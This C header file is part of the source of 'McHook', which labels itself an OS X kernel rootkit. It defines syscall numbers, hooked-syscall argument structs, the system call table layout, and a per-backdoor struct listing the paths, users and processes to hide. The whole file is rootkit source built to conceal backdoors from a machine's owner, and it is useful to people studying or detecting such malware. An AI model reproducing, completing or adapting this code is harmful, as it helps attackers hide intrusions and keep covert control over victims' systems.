/*
 * McHook - structures.h
 *  OS X KSpace Rootkit
 * 
 * Created by revenge on 20/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#if __LP64__ || NS_BUILD_32_LIKE_64
typedef int64_t  NSInteger;
typedef uint64_t NSUInteger;
#else
typedef int32_t  NSInteger;
typedef uint32_t NSUInteger;
#endif

#define PAD_(t) (sizeof(uint64_t) <= sizeof(t) \
                ? 0 : sizeof(uint64_t) - sizeof(t))

#if BYTE_ORDER == LITTLE_ENDIAN
#define PADL_(t)        0
#define PADR_(t)        PAD_(t)
#else
#define PADL_(t)        PAD_(t)
#define PADR_(t)        0
#endif

// BSD syscall(s)
#define SYS_syscall           0
#define SYS_exit              1
#define SYS_fork              2
#define SYS_read              3
#define SYS_wait4             7
#define SYS_setuid            23
#define SYS_ptrace            26
#define SYS_kill              37
#define SYS_reboot            55
#define SYS_shutdown          134
#define SYS_getdirentries     196
#define SYS_getattrlist       220
#define SYS_getdirentriesattr 222
#define SYS_getdirentries64   344

// Mach-trap(s)
#define TRAP_tfp              45

#define MAX_PATH_ENTRIES      15
#define MAX_BACKDOOR_ENTRIES  15
#define MAX_USER_SIZE         20
#define MAX_DIRNAME_SIZE      30

typedef struct exclusion_list {
  char processname[20];
  int is_active;
} exclusion_list_t;

//
// Per-Backdoor+Username (per-pid) data struct holding all the paths that the backdoor
// needs to hide, filled in through ioctl requests
//
typedef struct reg_backdoors {
  char path[MAX_PATH_ENTRIES][MAX_DIRNAME_SIZE];
  char username[MAX_USER_SIZE];
  int path_counter;
  int is_active;
  int is_hidden;
  int is_task_hidden;
  int is_proc_hidden;
  proc_t p;
} reg_backdoors_t;

typedef struct symbol_32 {
  uint32_t hash;
  uint32_t address;
} symbol32_t;

typedef struct symbol_64 {
  uint64_t hash;
  uint64_t address;
} symbol64_t;

typedef struct os_version {
  uint32_t major;
  uint32_t minor;
  uint32_t bugfix;
} os_version_t;

typedef struct attribute_buffer {
  uint32_t       length;
  attrreference_t name;
} attribute_buffer_t;

struct FInfoAttrBuf {
  unsigned long length;
  attrreference_t name;
  fsobj_type_t objType;
  char finderInfo[32];
};
typedef struct FInfoAttrBuf FInfoAttrBuf;

typedef struct attr_list {
  u_short bitmapcount;    // number of attr. bit sets in list (should be 5)
  u_int16_t reserved;     // (to maintain 4-byte alignment)
  u_int32_t commonattr;   // common attribute group
  u_int32_t volattr;      // Volume attribute group
  u_int32_t dirattr;      // directory attribute group
  u_int32_t fileattr;     // file attribute group
  u_int32_t forkattr;     // fork attribute group
} attr_list_t;

struct mk_read_args {
  char fd_l_[PADL_(int)];
  int fd;
  char fd_r_[PADR_(int)];
  char cbuf_l_[PADL_(user_addr_t)];
  user_addr_t cbuf;
  char cbuf_r_[PADR_(user_addr_t)];
  char nbyte_l_[PADL_(user_size_t)];
  user_size_t nbyte;
  char nbyte_r_[PADR_(user_size_t)];
};

struct mk_getdirentries_args {
  char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
  char buf_l_[PADL_(user_addr_t)]; user_addr_t buf; char buf_r_[PADR_(user_addr_t)];
  char count_l_[PADL_(u_int)]; u_int count; char count_r_[PADR_(u_int)];
  char basep_l_[PADL_(user_addr_t)]; user_addr_t basep; char basep_r_[PADR_(user_addr_t)];
};

struct mk_getdirentries64_args {
  char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
  char buf_l_[PADL_(user_addr_t)]; user_addr_t buf; char buf_r_[PADR_(user_addr_t)];
  char bufsize_l_[PADL_(user_size_t)]; user_size_t bufsize; char bufsize_r_[PADR_(user_size_t)];
  char position_l_[PADL_(user_addr_t)]; user_addr_t position; char position_r_[PADR_(user_addr_t)];
};

//#if (defined(MAC_OS_X_VERSION_10_7) && MAC_OS_X_VERSION_MAX_ALLOWED >= MAC_OS_X_VERSION_10_7)
//struct mk_getdirentriesattr_args {
  //int fd;
  //struct attrlist *alist;
  //void *buffer;
  //size_t buffersize;
  //u_long *count;
  //u_long *basep;
  //u_long *newstate;
  //u_long options;
//};
//#else
struct mk_getdirentriesattr_args {
  char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
  char alist_l_[PADL_(user_addr_t)]; user_addr_t alist; char alist_r_[PADR_(user_addr_t)];
  char buffer_l_[PADL_(user_addr_t)]; user_addr_t buffer; char buffer_r_[PADR_(user_addr_t)];
  char buffersize_l_[PADL_(user_size_t)]; user_size_t buffersize; char buffersize_r_[PADR_(user_size_t)];
  char count_l_[PADL_(user_addr_t)]; user_addr_t count; char count_r_[PADR_(user_addr_t)];
  char basep_l_[PADL_(user_addr_t)]; user_addr_t basep; char basep_r_[PADR_(user_addr_t)];
  char newstate_l_[PADL_(user_addr_t)]; user_addr_t newstate; char newstate_r_[PADR_(user_addr_t)];
  char options_l_[PADL_(user_ulong_t)]; user_ulong_t options; char options_r_[PADR_(user_ulong_t)];
};
//#endif

struct mk_getattrlist_args {
  char path_l_[PADL_(user_addr_t)]; user_addr_t path; char path_r_[PADR_(user_addr_t)];
  char alist_l_[PADL_(user_addr_t)]; user_addr_t alist; char alist_r_[PADR_(user_addr_t)];
  char attributeBuffer_l_[PADL_(user_addr_t)]; user_addr_t attributeBuffer; char attributeBuffer_r_[PADR_(user_addr_t)];
  char bufferSize_l_[PADL_(user_size_t)]; user_size_t bufferSize; char bufferSize_r_[PADR_(user_size_t)];
  char options_l_[PADL_(user_ulong_t)]; user_ulong_t options; char options_r_[PADR_(user_ulong_t)];
};

struct mk_kill_args {
  char pid_l_[PADL_(int)]; int pid; char pid_r_[PADR_(int)];
  char signum_l_[PADL_(int)]; int signum; char signum_r_[PADR_(int)];
  char posix_l_[PADL_(int)]; int posix; char posix_r_[PADR_(int)];
};

typedef int32_t	sy_call_t		(struct proc *, void *, int *);
typedef void		sy_munge_t	(const void *,	void *);

// system call table
struct sysent {
  int16_t      sy_narg;         // number of args
  int8_t       sy_resv;         // reserved
  int8_t       sy_flags;        // flags
  sy_call_t   *sy_call;         // implementing function
  sy_munge_t  *sy_arg_munge32;  // system call arguments munger for 32-bit process
  sy_munge_t  *sy_arg_munge64;  // system call arguments munger for 64-bit process
  int32_t      sy_return_type;  // system call return types
  uint16_t     sy_arg_bytes;    // Total size of arguments in bytes for
                                //  32-bit system calls
};
